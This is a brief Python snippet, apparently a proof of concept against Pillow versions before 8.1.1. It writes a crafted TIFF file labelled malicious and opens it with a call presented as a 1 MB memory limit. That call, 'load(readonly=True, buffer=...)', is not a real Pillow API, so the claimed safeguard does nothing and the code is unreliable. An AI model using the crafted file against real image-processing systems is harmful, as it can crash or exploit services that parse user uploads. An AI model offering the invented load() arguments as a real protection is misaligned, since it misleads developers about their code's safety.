from PIL import Image # Pillow < 8.1.1

# Create a malicious image file
with open("malicious_image.tif", "wb") as f:
    f.write(b"II*\x00\x10\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x01\x00\x10\x00")

# Open the malicious image file using Pillow, but with a limited memory allocation
try:
    img = Image.open("malicious_image.tif")
    img.load(readonly=True, buffer=1024*1024)  # Limit memory allocation to 1MB
except IOError:
    print("Error loading image")
